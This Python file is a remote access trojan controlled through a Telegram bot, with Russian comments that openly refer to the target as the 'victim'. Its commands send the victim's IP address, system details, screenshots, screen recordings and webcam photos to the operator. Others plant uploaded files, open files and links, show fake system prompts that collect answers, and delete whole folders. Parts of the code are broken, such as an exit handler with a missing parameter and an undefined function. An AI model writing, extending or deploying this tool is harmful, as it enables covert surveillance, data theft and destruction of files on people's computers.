import telebot
from telebot import types
import time
import pyautogui as pag
import cv2
import os
from os import listdir
from os.path import isfile, join
import os.path
import requests
import platform as pf
import random
import ctypes # --> тут можно сделать очень много крутого с этой бибилиотекой :)
import webbrowser as wb
import numpy as np
from moviepy.editor import VideoFileClip
import shutil


isFalse = False

API_TOKEN = "" #Your Bot API token
chat_id = "" #Your privat chat-id

bot = telebot.TeleBot(API_TOKEN)

requests.post(f"https://api.telegram.org/bot{API_TOKEN}/sendMessage?chat_id={chat_id}&text=Online")

rand = []
rand = random.random() * 100
rand = str(rand)

#keyboard1 = types.ReplyKeyboardMarkup(resize_keyboard = True)
#keyboard2 = types.KeyboardButton()

#ПРОСТО СТАРТ И ФУНКЦИЯ КОТОРАЯ ОПРЕДЕЛЯЕТ КНОПКИ
@bot.message_handler(commands = ["start"])
def start(message):
	rmk = types.ReplyKeyboardMarkup(resize_keyboard = True)
	#btns = ['/ip', '/spec', '/screenshot', '/webcam', '/message', '/input', '/walp', '/exit']
	btns = ["/ip - Address🌎", '/spec - Specifications ⚙', '/scr - Screenshot 👀', '/record', '/view', '/cam - WebCam 📷' ,'/msg - Message ✉', 
	'/inp - Input 📩', '/walp - Wallpaper 🖼', '/link - Linking', '/upload', '/open', '/delete', '/exit']
	for btn in btns:
		rmk.add(types.KeyboardButton(btn))
	bot.send_message(message.chat.id,
		"""Выберите действие:
		/ip - Получить IP адрес
		/spec - Получить информацию о системе
		/screenshot - Получить снимок экрана
		/record - Записать видео с екрана жертвы
		/view - просмотреть файлы в папке по указанному вами пути
		/webcam - Получить снимок экрана
		/message - Отправить сообщение
		/input - Отправить сообщение -с возможностью ответа
		/wallpaper - Сменить обои
		/photo - Фото
		/link - открывает сайт с вашем ссылкой
		/upload - загрузить файл
		/open - открыть файл
		/delete - удалить файл по пути
		/exit - Выйти из бота (Он остановит свою функцию что не рекомендуеться!)
		
		""", reply_markup=rmk)
@bot.message_handler(content_types=["text"])
def commands_handler(message):
	if message.text == "/ip - Address🌎":
		ip_adress(message)
	elif message.text == "/ip":
		ip_adress(message)
	elif message.text == "/spec - Specifications ⚙":
		spec(message)
	elif message.text == "/spec":
		spec(message)
	elif message.text == "/scr - Screenshot 👀":
		screenshot(message)
	elif message.text == "/scr":
		screenshot(message)
	elif message.text == "/record":
		video_recorder(message)
	elif message.text == "/view":
		view_message_handle(message)
	elif message.text == "/cam - WebCam 📷":
		webcam(message)
	elif message.text == "/cam":
		webcam(message)
	elif message.text == "/msg - Message ✉":
		message_sending(message)
	elif message.text == "/msg":
		message_sending(message)
	elif message.text == "/inp - Input 📩":
		message_sending_with_input(message)
	elif message.text == "/inp":
		message_sending_with_input(message)
	elif message.text == "/walp - Wallpaper 🖼":
		wallpaper(message)
	elif message.text == "/walp":
		wallpaper(message)
	elif message.text == "/link - Linking":
		linking(message)
	elif message.text == "/link":
		linking(message)
	elif message.text == "/upload":
		upload_file(message)
	elif message.text == "/open":
		open_file(message)
	elif message.text == "/delete":
		delete_file(message)
	elif message.text == "/exit":
		exit(message)

#ВЫЧИСЛЯЕМ АЙПИ
@bot.message_handler(commands = ["ip"])
def ip_adress(message):
	response = requests.get("http://jsonip.com").json()
	bot.send_message(message.chat.id, f"IP Adress: {response['ip']}")

#НАБЛЮДЕНИЕ ЗА КОМПОМ
@bot.message_handler(commands = ["spec"])
def spec(message):
	info = f"Name PC: {pf.node()}\nProcessor: {pf.processor()} \nSystem:{pf.system()} \nrelease_data: {pf.release()}"
	bot.send_message(message.chat.id, info)

#СКРИНШОТ ЕКРАНА
@bot.message_handler(commands = ["screenshot"])
def screenshot(message):
	pag.screenshot(rand + '.jpg')
	#pag.screenshot(r"C:/Users/User111/Desktop/ВСЕВСЕ Папки/
					#Python projects/screens" + rand + ".png")

	with open(rand + '.jpg', 'rb') as img:
		bot.send_photo(message.chat.id, img)

#Запись видео с монитора
@bot.message_handler(commands = ["video_record"])
def video_recorder(message):
	try:
		screen_sz = pag.size()
		fourcc = cv2.VideoWriter_fourcc(*'XVID')
		out = cv2.VideoWriter('output.avi', fourcc, 10.0, (screen_sz))
	    
		for i in range(80):
			img = pag.screenshot()
			frame = np.array(img)
			frame = cv2.cvtColor(frame, cv2.COLOR_BGR2RGB)
			out.write(frame)
			cv2.imshow("screenshot",  frame)

			if cv2.waitKey(1) == ord("q"):
				break
	        
		cv2.destroyAllWindows()
		out.release()

		# Convert the AVI file to MP4 using MoviePy
		clip = VideoFileClip('output.avi')
		clip.write_videofile('output.mp4')
		clip.close()

		# Send the MP4 video file using bot.send_video
		video = open('output.mp4', 'rb')
		bot.send_video(message.chat.id, video)

		# Delete the video files
		video.close()
		os.remove('output.avi')
		os.remove('output.mp4')

	except Exception as ex:
		bot.send_message(message.chat.id, f"Ошибка: {ex}")



@bot.message_handler(commands=['view files'])
def view_message_handle(message):
	msg = bot.send_message(message.chat.id, "В какой папке посмотрим файлы?")
	bot.register_next_step_handler(msg, next_view_message)

def next_view_message(message):
	try:
		viewed = os.listdir(message.text)
		# Функция, которая возвращает 0 если есть расширение и 1 если нет
		def the_sorted(file):
			return 1 if '.' in file else 0
		# Сортируем список, помещая файлы с расширением в начало списка
		viewed_sorted = sorted(viewed, key = the_sorted)

		viewed_all = '\n'.join(viewed_sorted)
		bot.send_message(message.chat.id, viewed_all)
	except Exception as ex:
		bot.send_message(message.chat.id, f"Произошла ошибка: {ex}")

#Загрузка файлов на комп жертвы
@bot.message_handler(commands=['upload'])
def upload_file(message):
	bot.send_message(message.chat.id, "Отправь файл который ты хочешь загрузить")

	@bot.message_handler(content_types=['document'])
	def handle_file(message):
		if message.document is None:
			bot.send_message(message.chat.id, "Введите путь установки: ")
			return

		file_info = bot.get_file(message.document.file_id)
		if file_info is None:
			bot.send_message(message.chat.id, "Информация о файле не была получена")
			return

		downloaded_file = bot.download_file(file_info.file_path)
		if downloaded_file is None:
			bot.send_message(message.chat.id, "Файл не удалось скачать")
			return

		msg = bot.send_message(message.chat.id, "Укажите путь для загрузки файла")
		bot.register_next_step_handler(msg, file_download)

	def file_download(message):
		try:
			file_path = message.text.strip()
			try:
				with open(file_path, 'wb') as new_file:
					new_file.write(downloaded_file)
				bot.send_message(message.chat.id, "Файл загружен")
			except PermissionError:
				bot.send_message(message.chat.id, f"Ошибка доступа: нет разрешения на запись в '{file_path}'. Введите другой путь:")
				bot.register_next_step_handler(message, process_download)
		except Exception as e:
			bot.send_message(message.chat.id, f"Возникла ошибка: {e}")

#Открытие файлов (любых)
@bot.message_handler(commands=['open_file'])
def open_file(message):
	msg = bot.send_message(message.chat.id, "Введите путь к файлу его название и расширение: ")
	bot.register_next_step_handler(msg, next_open_file)

def next_open_file(message):
	try:
		path = (message.text)
		os.open (path)
		bot.send_message(message.chat.id, 'Файл открыт')

	except Exception as ex:
		bot.send_message(message.chat.id, 'Возникли некоторые трудности...{ex}')


#ПРОСМОТР КАМЕРЫ ЖЕРТВЫ (Фото)
@bot.message_handler(commands = ["webcam"])
def webcam(message):
	filename = "cam.jpg"
	cap = cv2.VideoCapture(1)

	for i in range(10):
		cap.read()

	ret, frame = cap.read()

	cv2.imwrite(filename, frame)
	cap.release()

	with open(filename, "rb") as img:
		bot.send_photo(message.chat.id, img)
	os.remove(filename)
		
#ОДНОСТОРОННЕЕ СООБЩЕНИЕ ОТ МЕНЯ
@bot.message_handler(commands = ["message"])
def message_sending(message):
	msg = bot.send_message(message.chat.id, "Введите ваше сообщение: ")
	bot.register_next_step_handler(msg, next_message_sending)

def next_message_sending(message):
	try:
		pag.alert(message.text, 'System_Message')
	except Exception:
		bot.send_message(message.chat.id, 'Возникли некоторые трудности...')

#СООБЩЕНИЕ НА КОТОРОЕ МОЖНО ОТВЕТИТЬ
@bot.message_handler(commands = ["input"])
def message_sending_with_input(message):
	msg = bot.send_message(message.chat.id, "Введите ваше сообщение: ")
	bot.register_next_step_handler(msg, next_message_sending_with_input)

def next_message_sending_with_input(message):
	try:
		answer = pag.prompt(message.text, 'Input_Your_Answer')#ico name
		bot.send_message(message.chat.id, answer)
	except Exception:
		bot.send_message(message.chat.id, "Возникли некоторые трудности... или нету ответа")

#СМЕНА ОБОЕВ
@bot.message_handler(commands=["wallpaper"])
def wallpaper(message):
	msg = bot.send_message(message.chat.id, "Отправьте картинку:")
	bot.register_next_step_handler(msg, set_wallpaper)


@bot.message_handler(content_types=["photo"])
def set_wallpaper(message):
	try:
		file = message.photo[-1].file_id
		file = bot.get_file(file)

		download_file = bot.download_file(file.file_path)
		with open("image.jpg", "wb") as img:
			img.write(download_file)
		bot.send_message(message.chat.id, "Обои успешно были заменены")
		
		path = os.path.abspath("image.jpg")
		ctypes.windll.user32.SystemParametersInfoW(20, 0, path, 0)
		
	except Exception as ex:
		bot.send_message(message.chat.id, f"Произошла ошибка: {ex}")
#Открыть ссылку
@bot.message_handler(commands=["link"])
def linking(message):
	msg = bot.send_message(message.chat.id, "Введите вашу ссылку: ")
	bot.register_next_step_handler(msg, next_linking)

def next_linking(message):
	try:
		link = wb.open_new_tab(message.text)#ico
		bot.send_message(message.chat.id, link)
		bot.send_message(message.chat.id, "Ссылка была открыта")
	except Exception as ex:
		bot.send_message(message.chat.id, "Возникли некоторые трудности... или нету сайта {ex}")

#Удаляет папку с файлами(сильно можно поднасрать
#я себе так однажды пол рабочего стола нахуй удалил)
@bot.message_handler(commands=['delete files'])
def delete_file(message):
	msg = bot.send_message(message.chat.id, "какую папку ты хочешь удалить?")
	bot.register_next_step_handler(msg, next_delete_file)

def next_delete_file(message):
	try:
		shutil.rmtree(message.text)
		bot.send_message(message.chat.id,  f"Папка успешно удалена")
	except Exception as ex:
		bot.send_message(message.chat.id, f"Произошла ошибка: {ex}")

#ПРОСТО ВЫХОД ИЗ ПРОГИ
@bot.message_handler(commands = ["exit"])
def exit():
	bot.send_message(message.chat.id, "Программа офнута")
	exit (0)
	print ('Закрытие программы')
	

#ЗАПУСК ПРОГИ
if __name__ == '__main__':
	bot.polling()
